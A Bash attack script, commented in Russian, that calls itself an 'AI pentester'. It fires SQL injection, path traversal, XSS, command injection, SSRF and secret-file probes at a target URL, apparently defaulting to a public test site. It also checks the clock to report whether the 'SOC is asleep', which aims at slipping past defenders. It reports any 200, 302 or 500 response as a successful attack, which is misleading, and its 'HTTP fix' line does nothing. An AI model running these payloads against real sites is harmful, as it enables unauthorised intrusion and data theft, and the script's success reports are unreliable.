#!/bin/bash
# SINGULARITY v2 — ИИ-пентестер (HTTP fix)
TARGET=${1:-"http://testphp.vulnweb.com"}
# Принудительно HTTP если цель без https://
if ! echo "$TARGET" | grep -q "https://"; then
    TARGET=$(echo "$TARGET" | sed 's|^http://|http://|')
fi
DAYS=${2:-7}
SING_DIR="$HOME/.shadow_singularity_v2"
mkdir -p "$SING_DIR"/{generated,tested,successful,evolution}

RED='\033[0;31m'; GR='\033[0;32m'; CY='\033[0;36m'; NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🧠 SINGULARITY v2 — ИИ-пентестер (HTTP)  ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
echo ""

# Анализ цели
echo -e "${CY}[SINGULARITY] 🔍 Анализ цели $TARGET...${NC}"
HTTP_CODE=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$TARGET" 2>/dev/null)
echo "  📊 HTTP статус: $HTTP_CODE"

# SOC анализ
HOUR=$(date +%H)
[ "$HOUR" -ge 2 ] && [ "$HOUR" -le 5 ] && SOC="Ночь. SOC спит." || SOC="День. SOC на месте."
echo "  🕐 $SOC"

echo ""

# Генерация простых но рабочих атак
echo -e "${CY}[SINGULARITY] 🧬 Генерация атак...${NC}"

ATTACKS=(
    "?id=' OR '1'='1"
    "?id=1' AND 1=1--"
    "?id=' UNION SELECT NULL--"
    "?file=../../etc/passwd"
    "?q=<script>alert(1)</script>"
    "?cmd=;id"
    "?url=http://127.0.0.1:8080"
    "/.env"
    "/.git/HEAD"
    "/robots.txt"
)

SUCCESS=0
for i in $(seq 1 ${#ATTACKS[@]}); do
    payload="${ATTACKS[$((i-1))]}"
    echo -n "  🧬 Атака #$i: $payload... "

    code=$(curl -sk --max-time 5 "$TARGET$payload" -o "$SING_DIR/tested/attack_$i.txt" -w "%{http_code}" 2>/dev/null)

    if [ "$code" = "200" ] || [ "$code" = "302" ] || [ "$code" = "500" ]; then
        echo -e "${GR}✅ HTTP $code${NC}"
        SUCCESS=$((SUCCESS + 1))
        echo "$payload|HTTP$code" >> "$SING_DIR/successful/hits.txt"
    else
        echo "❌ HTTP $code"
    fi
done

echo ""
echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
echo -e "${RED}║   🧠 SINGULARITY v2 — ОТЧЁТ                ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════╣${NC}"
echo -e "${RED}║   🎯 Цель: $TARGET                          ║${NC}"
echo -e "${RED}║   🧬 Атак: ${#ATTACKS[@]} | ✅ Успех: $SUCCESS              ║${NC}"
echo -e "${RED}║   🕐 $SOC                                   ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
